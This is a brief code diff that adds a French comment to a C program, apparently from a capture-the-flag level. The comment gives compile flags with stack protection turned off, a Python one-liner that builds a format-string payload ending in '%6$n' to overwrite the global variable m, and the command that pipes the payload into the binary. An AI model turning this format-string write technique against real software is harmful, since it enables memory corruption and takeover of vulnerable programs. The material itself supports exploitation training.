@@ -1,7 +1,17 @@
+/*
+	Pour compiler le .c:
+	gcc -m32 -fno-stack-protector source.c -o level3
+
+	Ensuite:
+	python -c 'print "\x4c\xa0\x04\x08" + "A"*60+ "%6$n"' > /tmp/lvl3
+
+	Pour finir:
+	cat /tmp/lvl3 - | ./level3
+*/
 #include <stdio.h>
 #include <stdlib.h>
 
-static int	m = 0;
+static int	m = 0;			// Variable globale m
 
 void	v(void)
 {
